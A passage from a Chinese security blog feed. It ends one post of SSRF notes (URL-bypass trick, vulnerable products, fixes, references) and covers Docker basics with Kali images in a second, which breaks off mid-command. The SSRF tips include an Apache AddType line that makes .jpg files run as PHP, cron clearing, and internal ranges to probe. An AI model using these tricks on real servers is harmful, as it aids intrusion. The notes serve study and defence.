href="http://abc@10.153.138.81/" target="_blank" rel="external">http://abc@10.153.138.81/</a> 绕过</p><p>###0x05 漏洞示例</p><p>1.Wordpress3.5.1以下版本 xmlrpc.php pingback的缺陷与ssrf</p><p>2.discuz！的ssrf （利用php的header函数来绕过，其实就是302跳转实现协议转换）</p><p>3.weblogic的ssrf</p><h3 id="0x06-漏洞靶场"><a href="#0x06-漏洞靶场" class="headerlink" title="0x06 漏洞靶场"></a>0x06 漏洞靶场</h3><p><a href="https://github.com/jobertabma/ground-control" target="_blank" rel="external">https://github.com/jobertabma/ground-control</a></p><p>###0x07 漏洞修复</p><p>1.禁止跳转</p><p>2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p><p>4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p><p>5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</p><p>6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p>###0x08 漏洞利用中牵涉的小技巧</p><p>crontab -l 显示当前计划任务</p><p>crontab -r 清除当前计划任务</p><p>端口转发工具 socat</p><p>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行</p><p>AddType application/x-httpd-php .jpg<br>……</p><p>常用的探测内网地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">- 10.0.0.0/8</div><div class="line">- 127.0.0.1/32</div><div class="line">- 172.16.0.0/12</div><div class="line">- 192.168.0.0/16</div></pre></td></tr></table></figure><p>常用的探测端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">22、80、443、8080、8443</div></pre></td></tr></table></figure><p>###0x09 相关材料</p><p>[1]<a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="external">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a></p><p>[2]<a href="https://paper.seebug.org/393/" target="_blank" rel="external">https://paper.seebug.org/393/</a></p><p>[3]<a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF" target="_blank" rel="external">https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF</a></p><p>[4]<a href="http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html" target="_blank" rel="external">http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html</a></p><p>[5]<a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="external">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</a></p><p>[6]<a href="http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="external">http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</a></p><p>[7]<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="external">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p><p>[8]<a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="external">https://www.secpulse.com/archives/65832.html</a></p><p>[9]<a href="https://www.cnblogs.com/s0ky1xd/p/5859049.html" target="_blank" rel="external">https://www.cnblogs.com/s0ky1xd/p/5859049.html</a></p><p>[10]<a href="https://www.t00ls.net/articles-41070.html" target="_blank" rel="external">https://www.t00ls.net/articles-41070.html</a></p><p>[11]<a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></p><p>[12]<a href="https://ricterz.me/posts/HITCON%202017%20SSRFme" target="_blank" rel="external">https://ricterz.me/posts/HITCON%202017%20SSRFme</a></p><p>[13]<a href="http://bobao.360.cn/learning/detail/240.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/240.html</a></p><p>[14]<a href="https://github.com/JnuSimba/MiscSecNotes/tree/master/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="external">https://github.com/JnuSimba/MiscSecNotes/tree/master/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0</a></p><p>[15]<a href="https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf" target="_blank" rel="external">https://github.com/ring04h/papers/blob/master/build_your_ssrf_exp_autowork--20160711.pdf</a></p><p>###0x10 后记</p><p>这篇是我整理了之前的一篇笔记，这篇笔记中没有给出案例。后面有空了也会把自己的一些案例笔记整理下。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Docker笔记</title>
      <link href="/2017/12/02/Docker%E7%AC%94%E8%AE%B0%E2%80%94%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
      <url>/2017/12/02/Docker%E7%AC%94%E8%AE%B0%E2%80%94%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
      <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。</p><p>Docker容器：一个轻量级沙箱，来运行和隔离应用</p><p>Docker仓库：用来存储Docker镜像文件的地方</p><p>Docker中用于区分的方式是id或者name:tag</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>官方文档：<a href="https://docs.docker.com/" target="_blank" rel="external">https://docs.docker.com/</a></p><h3 id="操作镜像"><a href="#操作镜像" class="headerlink" title="操作镜像"></a>操作镜像</h3><h4 id="1-获取镜像（默认是从docker-hub网站进行镜像的获取）"><a href="#1-获取镜像（默认是从docker-hub网站进行镜像的获取）" class="headerlink" title="1.获取镜像（默认是从docker hub网站进行镜像的获取）"></a>1.获取镜像（默认是从docker hub网站进行镜像的获取）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">docker pull kalilinux/kali-linux-docker</div><div class="line"><span class="comment">#如果想使用非官方仓库需要指定仓库完整的地址</span></div><div class="line">docker pull hub.c.163.com/public/ubuntu:14.04</div></pre></td></tr></table></figure><p>建议：使用中科大镜像源    <code>https://docker.mirrors.ustc.edu.cn</code></p><p>附带：<a href="https://segmentfault.com/a/1190000006146697" target="_blank" rel="external">在国内 docker build 的正确姿势</a></p><h4 id="2-列出镜像"><a href="#2-列出镜像" class="headerlink" title="2.列出镜像"></a>2.列出镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  ~ docker images</div><div class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">kalilinux/kali-linux-docker   latest              8ececeaf404d        9 months ago        1.56GB</div></pre></td></tr></table></figure><p>REPOSITORY:来自哪个仓库</p><p>TAG:镜像的标签信息，能标示来自同一仓库的不同镜像</p><p>IMAGE ID:镜像的ID，此字段唯一标示了镜像</p><p>CREATED:创建时间</p><p>SIZE:镜像的大小</p><h4 id="3-添加镜像标签"><a href="#3-添加镜像标签" class="headerlink" title="3.添加镜像标签"></a>3.添加镜像标签</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#对kalilinux/kali-linux-docker:latest添加新的标签kalilinux:latest</span></div><div class="line">➜  ~ docker tag kalilinux/kali-linux-docker:latest kalilinux:latest</div><div class="line"><span class="comment">#别名不一样但是两者的镜像文件是一样的（id相同）</span></div><div class="line">➜  ~ docker images</div><div class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">kalilinux/kali-linux-docker   latest              8ececeaf404d        9 months ago        1.56GB</div><div class="line">kalilinux                     latest              8ececeaf404d        9 months ago        1.56GB</div></pre></td></tr></table></figure><h4 id="4-查看详细信息"><a href="#4-查看详细信息" class="headerlink" title="4.查看详细信息"></a>4.查看详细信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">➜  ~ docker inspect kalilinux:latest</div><div class="line">[</div><div class="line">    &#123;</div><div class="line">        <span class="string">"Id"</span>: <span class="string">"sha256:8ececeaf404d5d63d4e9bf870f4340516f3be040e5db6c005ac8cf96d2c43536"</span>,</div><div class="line">        <span class="string">"RepoTags"</span>: [</div><div class="line">            <span class="string">"kalilinux/kali-linux-docker:latest"</span>,</div><div class="line">            <span class="string">"kalilinux:latest"</span></div><div class="line">        ],</div><div class="line">        <span class="string">"RepoDigests"</span>: [</div><div class="line">            <span class="string">"kalilinux/kali-linux-docker@sha256:2ebc75f51fa4937340a0d3b4fe903c60aad23866b8c9e1fae80ad7372e01b71d"</span></div><div class="line">        ],</div><div class="line">        ......</div><div class="line">        <span class="string">"Metadata"</span>: &#123;</div><div class="line">            <span class="string">"LastTagTime"</span>: <span class="string">"2017-12-02T04:56:53.8185955Z"</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">]</div></pre></td></tr></table></figure><h4 id="5-查看镜像历史"><a href="#5-查看镜像历史" class="headerlink" title="5.查看镜像历史"></a>5.查看镜像历史</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜  ~ docker <span class="built_in">history</span> kalilinux:latest</div><div class="line">IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT</div><div class="line">8ececeaf404d        9 months ago        /bin/sh -c <span class="comment">#(nop)  CMD ["/bin/bash"]            0B</span></div><div class="line">&lt;missing&gt;           9 months ago        /bin/sh -c apt-get -y update &amp;&amp; apt-get -y...   251MB</div><div class="line">&lt;missing&gt;           9 months ago        /bin/sh -c <span class="comment">#(nop)  ENV DEBIAN_FRONTEND=non...   0B</span></div><div class="line">&lt;missing&gt;           9 months ago        /bin/sh -c <span class="built_in">echo</span> <span class="string">"deb http://http.kali.org/...   134B</span></div><div class="line">&lt;missing&gt;           9 months ago        /bin/sh -c #(nop)  MAINTAINER steev@kali.org    0B</div><div class="line">&lt;missing&gt;           11 months ago       /bin/sh -c #(nop)  CMD ["/bin/bash<span class="string">"]            0B</span></div><div class="line">&lt;missing&gt;           11 months ago       /bin/sh -c apt-get -y update &amp;&amp; apt-get -y...   286MB</div></pre></td></tr></table></figure><h4 id="6-搜索镜像"><a href="#6-搜索镜像" class="headerlink" title="6.搜索镜像"></a>6.搜索镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#搜索所有自动创建的评价为1+的带kali关键字的镜像</span></div><div class="line">➜  ~ docker search --automated <span class="_">-s</span> 3 kali</div><div class="line">Flag --automated has been deprecated, use --filter=is-automated=<span class="literal">true</span> instead</div><div class="line">Flag --stars has been deprecated, use --filter=stars=3 instead</div><div class="line">NAME                           DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</div><div class="line">kalilinux/kali-linux-docker    Kali Linux Rolling Distribution Base Image      361                                     [OK]</div><div class="line">linuxkonsult/kali-metasploit   Kali base image with metasploit                 54                                      [OK]</div><div class="line">jasonchaffee/kali-linux        Kali Linux Docker Container with the kali-...   8                                       [OK]</div><div class="line">brimstone/kali                                                                 6                                       [OK]</div><div class="line">adamoss/kali2-metasploit       Kali2 Automated Build                           4                                       [OK]</div><div class="line">wsec/kali-metasploit           Official Kali Base image + Metasploit           3                                       [OK]</div><div class="line">kalinon/comicstreamer          ComicStreamer is a media server app <span class="keyword">for</span> sh...   3                                       [OK]</div></pre></td></tr></table></figure><h4 id="7-删除镜像"><a href="#7-删除镜像" class="headerlink" title="7.删除镜像"></a>7.删除镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#如果同一个标签有多个tag，那么docker rmi只是删除tag而已</span></div><div class="line"><span class="comment">#如果docker rmi id的话，会先删除所有的tag然后删除镜像</span></div><div class="line"><span class="comment">#但是若该镜像的容器存在，也是无法删除的，如果想强制删除可以使用docker rmi -f id</span></div><div class="line">➜  ~ docker images</div><div class="line">REPOSITORY                    TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">kalilinux/kali-linux-docker   latest              8ececeaf404d        9 months ago        1.56GB</div><div class="line">kalilinux                     latest              8ececeaf404d        9 months ago        1.56GB</div><div class="line">➜  ~ docker rmi kalilinux/kali-linux-docker:latest</div><div class="line">Untagged: kalilinux/kali-linux-docker:latest</div><div class="line">Untagged: kalilinux/kali-linux-docker@sha256:2ebc75f51fa4937340a0d3b4fe903c60aad23866b8c9e1fae80ad7372e01b71d</div><div class="line">➜  ~ docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">kalilinux           latest              8ececeaf404d        9 months ago        1.56GB</div></pre></td></tr></table></figure><h4 id="8-创建镜像"><a href="#8-创建镜像" class="headerlink" title="8.创建镜像"></a>8.创建镜像</h4><p>1）基于已有镜像的容器创建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#我们先创建容器并安装metasploit-framework</span></div><div class="line">➜  ~ docker run -it kalilinux:latest /bin/bash</div><div class="line">root@de573c5f5dc6:/<span class="comment"># apt update &amp;&amp; apt install metasploit-framework</span></div><div class="line">root@de573c5f5dc6:/<span class="comment">#exit</span></div><div class="line"><span class="comment">#记住id为de573c5f5dc6</span></div><div class="line"><span class="comment">#docker commit -m "改动信息" -a "作者名称" id REPOSITORY:TAG</span></div><div class="line">➜  ~ docker commit -m <span class="string">"install msf"</span> <span class="_">-a</span> <span class="string">"zeroyu"</span> de573c5f5dc6 kalilinux:0.1</div><div class="line">sha256:66a6770d79d88c826b2e4a38b98037c14de0b9d2ce897307dc30afbf675ce51a</div><div class="line">➜  ~ docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">kalilinux           0.1                 66a6770d79d8        21 seconds ago      2.54GB</div><div class="line">kalilinux           latest              8ececeaf404d        9 months ago        1.56GB</div></pre></td></tr></table></figure><p>2）基于本地模板导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker import ...</div></pre></td></tr></table></figure><h4 id="9-存出和载入镜像"><a href="#9-存出和载入镜像" class="headerlink" title="9.存出和载入镜像"></a>9.存出和载入镜像</h4><p>1）存出镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker save -o docker_for_msf.tar kalilinux:0.1</div></pre></td></tr></table></figure><p>2）载入镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">docker load --input docker_for_msf.tar</div><div class="line"><span class="comment">#或则</span></div><div class="line">docker load &lt; docker_for_msf.tar</div></pre></td></tr></table></figure><h4 id="10-上传镜像"><a href="#10-上传镜像" class="headerlink" title="10.上传镜像"></a>10.上传镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker push kalilinux:0.1</div></pre></td></tr></table></figure><h3 id="操作容器"><a href="#操作容器" class="headerlink" title="操作容器"></a>操作容器</h3><h4 id="1-创建容器"><a href="#1-创建容器" class="headerlink" title="1.创建容器"></a>1.创建容器</h4><p>1）新建容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#docker create新建的容器处于静止，可以使用docker start来启动它</span></div><div class="line"><span class="comment">#-i 保持标准输入打开   -t分配一个伪终端</span></div><div class="line">➜  ~ docker create -it kalilinux:0.1</div><div class="line">2bc48b88a424c8056fe9e6311848d5850c4e46008feec99ee095bc341ae9adaf</div><div class="line"><span class="comment">#查看处于终止状态的容器</span></div><div class="line">➜  ~ docker ps <span class="_">-a</span></div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                   PORTS               NAMES</div><div class="line">2bc48b88a424        kalilinux:0.1       <span class="string">"/bin/bash"</span>         7 seconds ago       Created                                      frosty_poitras</div><div class="line">de573c5f5dc6        kalilinux:latest    <span class="string">"/bin/bash"</span>         5 hours ago         Exited (0) 5 hours ago                       happy_goldberg</div></pre></td></tr></table></figure><p>2）启动容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#docker start id 启动相应的容器</span></div><div class="line"><span class="comment">#docker ps 查看运行中的容器</span></div><div class="line">➜  ~ docker start 2bc48b88a424</div><div class="line">2bc48b88a424</div><div class="line">➜  ~ docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">2bc48b88a424        kalilinux:0.1       <span class="string">"/bin/bash"</span>         9 minutes ago       Up 8 seconds                            frosty_poitras</div></pre></td></tr></table></figure><p>3）新建并启动容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#docker run = docker create + docker start</span></div><div class="line"><span class="comment">#run的过程：1.检查镜像是否存在，不存在就下载；2.用镜像创建容器；挂载可读写层；3.分配虚拟接口</span></div><div class="line"><span class="comment">#4.分配IP；5.运行指定程序；6.执行完自动终止</span></div><div class="line">➜  ~ docker run kalilinux:0.1 /bin/<span class="built_in">echo</span> <span class="string">'zeroyu'</span></div><div class="line">zeroyu</div><div class="line">➜  ~ docker ps <span class="_">-a</span></div><div class="line">CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS                     PORTS               NAMES</div><div class="line">d6a6045c4f8b        kalilinux:0.1       <span class="string">"/bin/echo zeroyu"</span>   3 minutes ago       Exited (0) 3 minutes ago                       cocky_kirch</div><div class="line">➜  ~ docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line"><span class="comment">#常用命令如下</span></div><div class="line">➜  ~ docker run -it kalilinux:0.1 /bin/bash</div><div class="line">root@2ed8aa5354f1:/<span class="comment"># ps</span></div><div class="line">  PID TTY          TIME CMD</div><div class="line">    1 pts/0    00:00:00 bash</div><div class="line">    7 pts/0    00:00:00 ps</div><div class="line">root@2ed8aa5354f1:/<span class="comment"># exit</span></div><div class="line"><span class="built_in">exit</span></div><div class="line"><span class="comment">#退出后自动处于终止状态</span></div><div class="line">➜  ~ docker ps <span class="_">-a</span></div><div class="line">CONTAINER ID        IMAGE               COMMAND              CREATED              STATUS                      PORTS               NAMES</div><div class="line">2ed8aa5354f1        kalilinux:0.1       <span class="string">"/bin/bash"</span>          About a minute ago   Exited (0) 48 seconds ago                       goofy_bardeen</div></pre></td></tr></table></figure><p>4）守护态运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#在后台运行容器</span></div><div class="line">➜  ~ docker run <span class="_">-d</span> kalilinux:0.1 /bin/sh -c <span class="string">"while true ; do echo zeroyu ; sleep 1 ; done"</span></div><div class="line">88f12c0725a466ba6d8f08f34<span class="built_in">fc</span>8e9ac263ecafdff0a9e7282d7e9bb4073e6a0</div><div class="line">➜  ~ docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES</div><div class="line">88f12c0725a4        kalilinux:0.1       <span class="string">"/bin/sh -c 'while..."</span>   7 seconds ago       Up 7 seconds                            sleepy_kowalevski</div><div class="line">➜  ~ docker logs 88f12c0725a4</div><div class="line">zeroyu</div><div class="line">zeroyu</div><div class="line">zeroyu</div><div class="line">......</div></pre></td></tr></table></figure><h4 id="2-终止容器"><a href="#2-终止容器" class="headerlink" title="2.终止容器"></a>2.终止容器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#id为88f12c0725a4但是可以使用前几位来简单表示</span></div><div class="line">➜  ~ docker stop 88</div><div class="line">88</div><div class="line"><span class="comment">#查看所有处于终止态的id</span></div><div class="line">➜  ~ docker ps -qa</div><div class="line">073ff4e1dac7</div><div class="line"><span class="comment">#处于终止状态可以使用start来重新启动</span></div><div class="line">➜  ~ docker start 073</div><div class="line">073</div><div class="line">➜  ~ docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED              STATUS              PORTS               NAMES</div><div class="line">073ff4e1dac7        kalilinux:0.1       <span class="string">"/bin/sh -c 'while..."</span>   About a minute ago   Up About a minute                       cranky_benz</div><div class="line"><span class="comment">#restart可以先终止再重新启动</span></div><div class="line">➜  ~ docker restart 073</div><div class="line">073</div></pre></td></tr></table></figure><h4 id="3-进入容器"><a href="#3-进入容器" class="headerlink" title="3.进入容器"></a>3.进入容器</h4><p>处于守护态（-d参数）的容器会在后台运行，但是你无法到信息，也无法进行操作。此时，要进入容器进行工作，要使用attach或者exec命令。</p><p>1）    使用attach命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#容器还可以使用name来唯一辨识</span></div><div class="line">➜  ~ docker run -itd kalilinux:0.1</div><div class="line">77e93d18a6a547c85d86925a0bf3c4ae734eec6fe235ae1c3fe0f19822f14360</div><div class="line">➜  ~ docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">77e93d18a6a5        kalilinux:0.1       <span class="string">"/bin/bash"</span>         20 seconds ago      Up 21 seconds                           stupefied_gates</div><div class="line">➜  ~ docker attach stupefied_gates</div><div class="line">root@77e93d18a6a5:/<span class="comment">#</span></div></pre></td></tr></table></figure><p>2）使用exec命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">➜  ~ docker ps <span class="_">-a</span></div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                          PORTS               NAMES</div><div class="line">77e93d18a6a5        kalilinux:0.1       <span class="string">"/bin/bash"</span>         5 minutes ago       Exited (0) About a minute ago                       stupefied_gates</div><div class="line">➜  ~ docker start 77e</div><div class="line">77e</div><div class="line">➜  ~ docker <span class="built_in">exec</span> -it 77e93d18a6a5 /bin/bash</div><div class="line">root@77e93d18a6a5:/<span class="comment">#</span></div></pre></td></tr></table></figure><h4 id="4-删除容器"><a href="#4-删除容器" class="headerlink" title="4.删除容器"></a>4.删除容器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜  ~ docker ps <span class="_">-a</span></div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">77e93d18a6a5        kalilinux:0.1       <span class="string">"/bin/bash"</span>         7 minutes ago       Up About a minute                       stupefied_gates</div><div class="line">➜  ~ docker rm 77e93d18a6a5</div><div class="line">Error response from daemon: You cannot remove a running container 77e93d18a6a547c85d86925a0bf3c4ae734eec6fe235ae1c3fe0f19822f14360. Stop the container before attempting removal or force remove</div><div class="line">➜  ~ docker stop 77e93d18a6a5</div><div class="line">77e93d18a6a5</div><div class="line">➜  ~ docker rm 77e93d18a6a5</div><div class="line">77e93d18a6a5</div></pre></td></tr></table></figure><h4 id="5-导入和导出容器"><a href="#5-导入和导出容器" class="headerlink" title="5.导入和导出容器"></a>5.导入和导出容器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#导出容器</span></div><div class="line"><span class="comment">#无论这个容器是否正在运行都是可以导出的</span></div><div class="line">➜  ~ docker <span class="built_in">export</span> -o test.tar 77e93d18a6a5</div><div class="line"><span class="comment">#或者执行</span></div><div class="line">➜  ~ docker <span class="built_in">export</span> 77e93d18a6a5 &gt; test.tar </div><div class="line"></div><div class="line"><span class="comment">#导入容器</span></div><div class="line">➜  ~ docker import test.tar - <span class="built_in">test</span>/kalilinux:v1.0</div></pre></td></tr></table></figure><h3 id="Docker数据管理"><a href="#Docker数据管理" class="headerlink" title="Docker数据管理"></a>Docker数据管理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#使用-v标记挂在本地的tmp目录到容器中的/opt/tmp_test</span></div><div class="line"><span class="comment">#使用rw（默认也是这种方式）来指定可读写</span></div><div class="line"><span class="comment">#下面的#表示的不是注释</span></div><div class="line">➜  ~ docker run -it -P  --name db -v /tmp:/opt/tmp_test:rw kalilinux:0.1 /bin/sh</div><div class="line"><span class="comment"># ls</span></div><div class="line">bin  boot  devetc  home  liblib64  media  mnt  optproc  root  run  sbin  srv  sys  tmp  usr  var</div><div class="line"><span class="comment"># cd opt</span></div><div class="line"><span class="comment"># ls</span></div><div class="line">tmp_test</div><div class="line"><span class="comment"># cd tmp_test</span></div><div class="line"><span class="comment"># ls</span></div><div class="line">com.apple.launchd.0fGM76e6ao  com.apple.launchd.UWfVYRXkwo  powerlog</div><div class="line">com.apple.launchd.AkQGotnulN  pip-FfQw68-unpack    zeroyu.txt</div><div class="line"><span class="comment">#</span></div></pre></td></tr></table></figure><h3 id="Docker端口映射"><a href="#Docker端口映射" class="headerlink" title="Docker端口映射"></a>Docker端口映射</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-P是指映射到任意端口</span></div><div class="line"><span class="comment">#-p加端口号(本地端口:远程端口=&gt;0.0.0.0:8080:80)，则将端口映射到所有地址的相应端口</span></div><div class="line">➜  ~ docker run -it <span class="_">-d</span> -p 5000:5000 kalilinux:v0.2</div><div 